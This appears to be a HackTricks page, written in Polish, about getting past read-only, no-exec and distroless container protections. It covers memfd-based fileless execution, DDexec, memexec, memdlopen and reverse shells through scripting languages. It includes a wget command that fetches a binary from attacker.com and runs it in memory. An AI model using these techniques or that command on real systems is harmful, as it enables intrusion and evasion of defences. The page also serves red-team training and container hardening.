# Obejście ochrony FS: tylko do odczytu / brak wykonania / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Filmy

W poniższych filmach znajdziesz techniki wspomniane na tej stronie wyjaśnione bardziej szczegółowo:

- [**DEF CON 31 - Eksploracja manipulacji pamięcią Linuxa w celu ukrycia i unikania**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Ukryte intruzje z DDexec-ng i in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## scenariusz tylko do odczytu / brak wykonania

Coraz częściej spotyka się maszyny linuxowe zamontowane z **ochroną systemu plików tylko do odczytu (ro)**, szczególnie w kontenerach. Dzieje się tak, ponieważ uruchomienie kontenera z systemem plików ro jest tak proste, jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Jednak nawet jeśli system plików jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc to fałsz, że nie możemy nic zapisać na dysku. Jednak ten folder będzie **zamontowany z ochroną brak wykonania**, więc jeśli pobierzesz tutaj binarny plik, **nie będziesz mógł go wykonać**.

> [!WARNING]
> Z perspektywy red teamu, to **utrudnia pobieranie i wykonywanie** binarnych plików, które nie są już w systemie (jak backdoory czy enumeratory takie jak `kubectl`).

## Najłatwiejsze obejście: Skrypty

Zauważ, że wspomniałem o binarnych plikach, możesz **wykonywać dowolny skrypt**, o ile interpreter jest w maszynie, jak **skrypt powłoki**, jeśli `sh` jest obecny, lub **skrypt Pythona**, jeśli `python` jest zainstalowany.

Jednak to nie wystarczy, aby wykonać swój binarny backdoor lub inne narzędzia binarne, które możesz potrzebować uruchomić.

## Obejścia pamięci

Jeśli chcesz wykonać binarny plik, ale system plików na to nie pozwala, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **ochrony nie mają tam zastosowania**.

### Obejście FD + syscall exec

Jeśli masz w maszynie potężne silniki skryptowe, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarny plik do wykonania z pamięci, przechować go w deskryptorze pliku pamięci (`create_memfd` syscall), który nie będzie chroniony przez te zabezpieczenia, a następnie wywołać **`exec` syscall**, wskazując **fd jako plik do wykonania**.

W tym celu możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binarny plik, a on wygeneruje skrypt w wskazanym języku z **binarnym plikiem skompresowanym i zakodowanym w b64** z instrukcjami do **dekodowania i dekompresji** w **fd** utworzonym przez wywołanie syscall `create_memfd` oraz wywołanie **syscall exec**, aby go uruchomić.

> [!WARNING]
> To nie działa w innych językach skryptowych, takich jak PHP czy Node, ponieważ nie mają one żadnego **domyślnego sposobu wywoływania surowych syscalli** z poziomu skryptu, więc nie można wywołać `create_memfd`, aby utworzyć **fd pamięci** do przechowywania binarnego pliku.
>
> Ponadto, utworzenie **zwykłego fd** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będziesz mógł go uruchomić, ponieważ **ochrona brak wykonania** będzie miała zastosowanie.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika, która pozwala na **modyfikację pamięci własnego procesu** poprzez nadpisanie jego **`/proc/self/mem`**.

Dlatego, **kontrolując kod assemblera**, który jest wykonywany przez proces, możesz napisać **shellcode** i "mutować" proces, aby **wykonać dowolny arbitralny kod**.

> [!TIP]
> **DDexec / EverythingExec** pozwoli ci załadować i **wykonać** własny **shellcode** lub **dowolny binarny plik** z **pamięci**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Aby uzyskać więcej informacji na temat tej techniki, sprawdź Github lub:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) jest naturalnym krokiem naprzód od DDexec. To **demonizowany shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.

Możesz znaleźć przykład, jak użyć **memexec do wykonywania plików binarnych z odwrotnego powłoki PHP** w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Z podobnym celem do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejszy sposób ładowania plików binarnych** w pamięci, aby później je wykonać. Może nawet pozwolić na ładowanie plików binarnych z zależnościami.

## Distroless Bypass

### Czym jest distroless

Kontenery distroless zawierają tylko **najmniejsze niezbędne komponenty do uruchomienia konkretnej aplikacji lub usługi**, takie jak biblioteki i zależności uruchomieniowe, ale wykluczają większe komponenty, takie jak menedżer pakietów, powłoka czy narzędzia systemowe.

Celem kontenerów distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminację niepotrzebnych komponentów** i minimalizację liczby podatności, które mogą być wykorzystane.

### Odwrotna powłoka

W kontenerze distroless możesz **nawet nie znaleźć `sh` ani `bash`**, aby uzyskać zwykłą powłokę. Nie znajdziesz również plików binarnych takich jak `ls`, `whoami`, `id`... wszystko, co zwykle uruchamiasz w systemie.

> [!WARNING]
> Dlatego **nie** będziesz w stanie uzyskać **odwrotnej powłoki** ani **enumerować** systemu tak, jak zwykle.

Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację flask, to python jest zainstalowany, a zatem możesz uzyskać **odwrotną powłokę Pythona**. Jeśli działa node, możesz uzyskać odwrotną powłokę Node, i to samo z większością **języków skryptowych**.

> [!TIP]
> Używając języka skryptowego, możesz **enumerować system** korzystając z możliwości języka.

Jeśli nie ma **ochron `read-only/no-exec`**, możesz wykorzystać swoją odwrotną powłokę do **zapisywania w systemie plików swoich plików binarnych** i **ich wykonywania**.

> [!TIP]
> Jednak w tego rodzaju kontenerach te zabezpieczenia zazwyczaj będą istnieć, ale możesz użyć **wcześniejszych technik wykonania w pamięci, aby je obejść**.

Możesz znaleźć **przykłady** na to, jak **wykorzystać niektóre podatności RCE**, aby uzyskać odwrotne powłoki języków skryptowych i wykonywać pliki binarne z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
